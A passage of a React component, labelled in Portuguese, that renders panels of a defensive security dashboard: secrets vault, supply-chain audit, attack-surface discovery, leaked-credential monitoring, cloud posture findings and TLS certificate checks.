                    <span className="text-[#666] block mb-1">&bull; Conexões de Rede (C2 Beaconing):</span>
                    {artifactReport.simulatedExecution.outboundConnections.map((conn, i) => (
                      <div key={i} className="text-yellow-400 text-[11px]">
                        &bull; {conn.ip}:{conn.port} ({conn.protocol}) &rarr; {conn.domain}
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 5. SECRETS VAULT & KMS */}
      {activeTool === 'vault' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* KMS Master Keys & Secret Generator */}
            <div className="space-y-4">
              <div className="bg-[#0F0F0F] border border-[#222] p-5 space-y-4">
                <h4 className="text-sm font-mono font-bold uppercase text-white flex items-center gap-2">
                  <Lock className="w-4 h-4 text-[#EAB308]" />
                  Chaves Mestras KMS Ativas
                </h4>
                <div className="space-y-3">
                  {DEFAULT_KMS_KEYS.map(k => (
                    <div key={k.keyId} className="bg-black border border-[#222] p-3 font-mono text-xs">
                      <div className="flex items-center justify-between text-[#EAB308] font-bold">
                        <span>{k.alias}</span>
                        <span className="text-[10px] px-1.5 bg-[#EAB308]/15 text-[#EAB308]">{k.state}</span>
                      </div>
                      <div className="text-[10px] text-[#666] mt-1">Rotação: a cada {k.rotationPeriodDays} dias (Próxima: {k.nextRotationDate})</div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Generate Ephemeral Secret */}
              <div className="bg-[#0F0F0F] border border-[#222] p-5 space-y-3">
                <h4 className="text-xs font-mono font-bold uppercase text-white">Criar Segredo Efêmero com TTL</h4>
                <input
                  type="text"
                  value={newSecretKey}
                  onChange={(e) => setNewSecretKey(e.target.value)}
                  placeholder="Nome da chave (ex: STRIPE_API_KEY)"
                  className="w-full bg-black border border-[#333] p-2 text-xs font-mono text-white focus:outline-none"
                />
                <input
                  type="text"
                  value={newSecretPath}
                  onChange={(e) => setNewSecretPath(e.target.value)}
                  placeholder="Path no cofre (ex: secret/data/prod)"
                  className="w-full bg-black border border-[#333] p-2 text-xs font-mono text-white focus:outline-none"
                />
                <button
                  onClick={() => {
                    const newSec = generateEphemeralSecret(newSecretPath, newSecretKey, 60);
                    setVaultSecrets([newSec, ...vaultSecrets]);
                  }}
                  className="w-full py-2 bg-[#EAB308] hover:bg-[#D4A007] text-black font-mono font-black text-xs uppercase cursor-pointer transition-all"
                >
                  + Emitir Token com TTL (60 min)
                </button>
              </div>
            </div>

            {/* Secrets List & Code Integration */}
            <div className="lg:col-span-2 space-y-4">
              <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-4">
                <h4 className="text-sm font-mono font-bold uppercase text-white flex items-center justify-between">
                  <span>Inventário de Segredos & Envelopes Criptográficos</span>
                  <span className="text-xs text-[#888] font-normal">{vaultSecrets.length} segredos gerenciados</span>
                </h4>

                <div className="space-y-3">
                  {vaultSecrets.map(sec => (
                    <div key={sec.id} className="bg-[#141414] border border-[#222] p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="text-xs font-mono font-bold text-white">{sec.key}</span>
                          <span className="text-[10px] font-mono px-2 py-0.5 bg-[#EAB308]/15 text-[#EAB308] border border-[#EAB308]/30 font-bold">
                            {sec.algorithm}
                          </span>
                          {sec.isEphemeral && (
                            <span className="text-[10px] font-mono px-2 py-0.5 bg-blue-500/20 text-blue-400 border border-blue-500/30">
                              TTL Expira: {sec.expiresAt}
                            </span>
                          )}
                        </div>
                        <div className="text-[11px] font-mono text-[#777] mt-1">
                          Path: <span className="text-[#AAA]">{sec.path}</span> (v{sec.version}) &bull; KMS: {sec.kmsKeyId}
                        </div>
                      </div>

                      <button
                        onClick={() => copyToClipboard(generateVaultClientSnippet(sec.path, sec.key), sec.id)}
                        className="px-3 py-1.5 bg-[#1F1F1F] hover:bg-[#282828] border border-[#333] text-white text-xs font-mono font-bold flex items-center gap-1.5 shrink-0"
                      >
                        {copiedKey === sec.id ? <Check className="w-3.5 h-3.5 text-[#00FF41]" /> : <Code className="w-3.5 h-3.5" />}
                        <span>SDK Snippet</span>
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 6. SUPPLY CHAIN & SLSA */}
      {activeTool === 'supplychain' && (
        <div className="space-y-6">
          <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#222]">
              <div>
                <h3 className="text-xl font-black uppercase text-white flex items-center gap-2">
                  <Layers className="w-5 h-5 text-[#A855F7]" />
                  Software Supply Chain & Cosign / SLSA Provenance v1.0
                </h3>
                <p className="text-xs font-mono text-[#888] mt-0.5">
                  Assinatura criptográfica com chaves Sigstore, atestados in-toto e detecção de Dependency Confusion.
                </p>
              </div>

              <button
                onClick={() => copyToClipboard(JSON.stringify(generateSlsaProvenance(slsaAttestationArtifact, 'e3b0c442...'), null, 2), 'slsa-json')}
                className="px-4 py-2 bg-[#A855F7] hover:bg-[#9333EA] text-white text-xs font-mono font-black uppercase flex items-center gap-2 transition-all cursor-pointer"
              >
                {copiedKey === 'slsa-json' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                <span>Exportar Atestado SLSA JSON</span>
              </button>
            </div>

            {/* Packages Audit */}
            <div className="space-y-3">
              <span className="text-xs font-mono text-[#A855F7] uppercase font-bold block">
                Auditoria de Dependências & Riscos de Typosquatting:
              </span>
              <div className="space-y-3">
                {SAMPLE_SUPPLY_CHAIN_PACKAGES.map(pkg => (
                  <div key={pkg.packageName} className="bg-[#141414] border border-[#222] p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4 font-mono text-xs">
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-bold text-white">{pkg.packageName}@{pkg.currentVersion}</span>
                        <span className="text-[10px] px-2 py-0.5 bg-[#222] text-[#AAA]">{pkg.registry}</span>
                        <span className="text-[10px] px-2 py-0.5 bg-[#A855F7]/20 text-[#A855F7] font-bold border border-[#A855F7]/30">
                          {pkg.slsaLevel}
                        </span>
                      </div>
                      {pkg.legitimateAlternative && (
                        <div className="text-[11px] text-[#FF7A00] mt-1">
                          Alerta de Substituição: {pkg.legitimateAlternative}
                        </div>
                      )}
                    </div>

                    <div className="flex items-center gap-2">
                      <span className={`px-2 py-0.5 text-[10px] font-bold uppercase ${
                        pkg.typosquattingRisk === 'SAFE' ? 'bg-[#00FF41]/20 text-[#00FF41] border border-[#00FF41]/40' :
                        pkg.typosquattingRisk === 'SUSPICIOUS' ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/40' :
                        'bg-[#FF3E00]/20 text-[#FF3E00] border border-[#FF3E00]/40 animate-pulse'
                      }`}>
                        {pkg.typosquattingRisk}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Cosign CLI commands */}
            <div className="bg-black border border-[#222] p-4 font-mono text-xs space-y-2">
              <span className="text-[#888] block">Comandos de Assinatura Criptográfica Cosign:</span>
              <code className="text-[#A855F7] block bg-[#0A0A0A] p-2 border border-[#1A1A1A]">
                {generateCosignCommand('ghcr.io/org/secscan-engine:latest').signCmd}
              </code>
            </div>
          </div>
        </div>
      )}

      {/* 7. EASM & OSINT */}
      {activeTool === 'easm' && (
        <div className="space-y-6">
          <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#222]">
              <div>
                <h3 className="text-xl font-black uppercase text-white flex items-center gap-2">
                  <Globe className="w-5 h-5 text-[#3B82F6]" />
                  External Attack Surface Management (EASM) & Shodan OSINT
                </h3>
                <p className="text-xs font-mono text-[#888] mt-0.5">
                  Descoberta passiva de subdomínios, portas abertas, Shadow IT e buckets de nuvem expostos.
                </p>
              </div>

              <div className="flex items-center gap-2">
                <input
                  type="text"
                  value={easmDomain}
                  onChange={(e) => setEasmDomain(e.target.value)}
                  className="bg-black border border-[#333] px-3 py-1.5 text-xs font-mono text-white focus:outline-none"
                />
                <button
                  className="px-4 py-2 bg-[#3B82F6] hover:bg-[#2563EB] text-white text-xs font-mono font-black uppercase transition-all"
                >
                  Escanear Superfície
                </button>
              </div>
            </div>

            <div className="space-y-3">
              {easmAssets.map(asset => (
                <div key={asset.id} className="bg-[#141414] border border-[#222] p-4 flex flex-col md:flex-row md:items-center justify-between gap-4 font-mono text-xs">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-sm font-bold text-white">{asset.domain}</span>
                      <span className="text-[10px] text-[#666]">[{asset.ipAddress}]</span>
                      <span className="text-[10px] px-2 py-0.5 bg-[#3B82F6]/20 text-[#3B82F6] border border-[#3B82F6]/30 font-bold">
                        {asset.assetType}
                      </span>
                    </div>
                    <div className="text-[11px] text-[#AAA] mt-1">{asset.details}</div>
                    <div className="flex items-center gap-2 mt-2 text-[10px] text-[#666]">
                      <span>Portas: {asset.ports.join(', ')}</span>
                      <span>&bull; Tech: {asset.technologies.join(', ')}</span>
                    </div>
                  </div>

                  <span className={`px-2 py-1 text-[10px] font-bold uppercase shrink-0 ${
                    asset.exposureVerdict === 'SECURED' ? 'bg-[#00FF41]/20 text-[#00FF41] border border-[#00FF41]/40' :
                    'bg-[#FF3E00]/20 text-[#FF3E00] border border-[#FF3E00]/40'
                  }`}>
                    {asset.exposureVerdict}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 8. DARK WEB MONITOR */}
      {activeTool === 'darkweb' && (
        <div className="space-y-6">
          <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#222]">
              <div>
                <h3 className="text-xl font-black uppercase text-white flex items-center gap-2">
                  <Ghost className="w-5 h-5 text-[#EC4899]" />
                  Dark Web & Compromised Credential Intelligence
                </h3>
                <p className="text-xs font-mono text-[#888] mt-0.5">
                  Monitoramento contínuo de e-mails corporativos em logs de infostealers (RedLine, LummaC2) e pastebins.
                </p>
              </div>

              <span className="text-xs font-mono px-3 py-1.5 bg-[#EC4899]/15 text-[#EC4899] border border-[#EC4899]/30 font-bold uppercase">
                {darkWebBreaches.length} IDENTIDADES COMPROMETIDAS
              </span>
            </div>

            <div className="space-y-3">
              {darkWebBreaches.map((acc, i) => (
                <div key={i} className="bg-[#141414] border border-[#222] p-4 flex flex-col md:flex-row md:items-center justify-between gap-4 font-mono text-xs">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-sm font-bold text-white">{acc.email}</span>
                      <span className="text-[10px] px-2 py-0.5 bg-[#EC4899]/20 text-[#EC4899] border border-[#EC4899]/30 font-bold">
                        {acc.stealerType}
                      </span>
                    </div>
                    <div className="text-[11px] text-[#AAA] mt-1">
                      Fonte: {acc.sourceBreach} ({acc.breachDate})
                    </div>
                    <div className="text-[10px] text-[#777] mt-1">
                      Dados Vazados: {acc.dataExposed.join(', ')} &bull; Arquivo no Repo: {acc.foundInRepoFile}
                    </div>
                  </div>

                  <div className="flex items-center gap-2 shrink-0">
                    <span className="px-2 py-1 bg-[#FF3E00]/20 text-[#FF3E00] border border-[#FF3E00]/40 text-[10px] font-bold uppercase">
                      {acc.remediationStatus}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 9. MULTI-CLOUD CSPM */}
      {activeTool === 'cspm' && (
        <div className="space-y-6">
          <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#222]">
              <div>
                <h3 className="text-xl font-black uppercase text-white flex items-center gap-2">
                  <Cloud className="w-5 h-5 text-[#10B981]" />
                  Multi-Cloud CSPM Scanner (AWS, Azure & GCP CIS Benchmarks)
                </h3>
                <p className="text-xs font-mono text-[#888] mt-0.5">
                  Auditoria de postura em nuvem com comandos CLI de remediação em 1 clique.
                </p>
              </div>
            </div>

            <div className="space-y-3">
              {cspmFindings.map(f => (
                <div key={f.id} className="bg-[#141414] border border-[#222] p-4 space-y-3 font-mono text-xs">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 bg-[#10B981]/20 text-[#10B981] font-bold border border-[#10B981]/30">
                        {f.provider}
                      </span>
                      <span className="text-sm font-bold text-white">{f.title}</span>
                    </div>
                    <span className="text-[10px] text-[#FF3E00] font-bold uppercase px-2 py-0.5 bg-[#FF3E00]/20 border border-[#FF3E00]/40">
                      {f.severity} ({f.cisBenchmarkControl})
                    </span>
                  </div>

                  <p className="text-[11px] text-[#AAA]">{f.description}</p>
                  
                  <div className="bg-black p-3 border border-[#222] flex items-center justify-between gap-4">
                    <code className="text-[#10B981] text-[11px] overflow-x-auto whitespace-pre block">
                      {f.remediationCli}
                    </code>
                    <button
                      onClick={() => copyToClipboard(f.remediationCli, f.id)}
                      className="px-2.5 py-1 bg-[#1A1A1A] hover:bg-[#252525] border border-[#333] text-white text-[10px] font-bold shrink-0 flex items-center gap-1"
                    >
                      {copiedKey === f.id ? <Check className="w-3 h-3 text-[#00FF41]" /> : <Copy className="w-3 h-3" />}
                      Copiar CLI
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 10. PKI & CERT-MANAGER */}
      {activeTool === 'pki' && (
        <div className="space-y-6">
          <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#222]">
              <div>
                <h3 className="text-xl font-black uppercase text-white flex items-center gap-2">
                  <Lock className="w-5 h-5 text-[#14B8A6]" />
                  PKI & TLS/SSL Certificate Manager
                </h3>
                <p className="text-xs font-mono text-[#888] mt-0.5">
                  Análise de versões TLS (1.0 - 1.3), cifras fracas (RC4, 3DES), expiração e gerador de CSR para mTLS.
                </p>
              </div>

              <button
                onClick={() => copyToClipboard(generateCsrSnippet('api.internal.corp', 'SecOps').csr, 'csr-sample')}
                className="px-3 py-1.5 bg-[#14B8A6] hover:bg-[#0D9488] text-black text-xs font-mono font-black uppercase"
              >
                {copiedKey === 'csr-sample' ? 'CSR Copiado!' : 'Gerar CSR mTLS'}
              </button>
            </div>

            <div className="space-y-4">
              {tlsCerts.map(cert => (
                <div key={cert.id} className="bg-[#141414] border border-[#222] p-4 flex flex-col md:flex-row md:items-center justify-between gap-4 font-mono text-xs">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-sm font-bold text-white">{cert.domain}</span>
                      <span className={`px-2 py-0.5 text-[10px] font-bold ${
                        cert.grade === 'A+' || cert.grade === 'A' ? 'bg-[#00FF41]/20 text-[#00FF41]' : 'bg-[#FF3E00]/20 text-[#FF3E00]'
                      }`}>
                        Nota: {cert.grade}
                      </span>
                    </div>
                    <div className="text-[11px] text-[#AAA] mt-1">
                      Emissor: {cert.issuer} &bull; Chave: {cert.keyType} {cert.keyLength} bits
                    </div>
                    {cert.weakCiphersDetected.length > 0 && (
                      <div className="text-[11px] text-[#FF3E00] mt-1">
                        Cifras Vulneráveis: {cert.weakCiphersDetected.join(', ')}
                      </div>
                    )}
                  </div>

                  <div className="text-right shrink-0">
                    <span className={`text-[10px] font-bold px-2 py-0.5 uppercase ${
                      cert.status === 'VALID' ? 'bg-[#00FF41]/10 text-[#00FF41]' :
                      cert.status === 'EXPIRING_SOON' ? 'bg-yellow-500/20 text-yellow-400' :
                      'bg-[#FF3E00]/20 text-[#FF3E00]'
                    }`}>
                      {cert.status} ({cert.daysRemaining > 0 ? `${cert.daysRemaining} dias restantes` : 'EXPIRADO'})
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
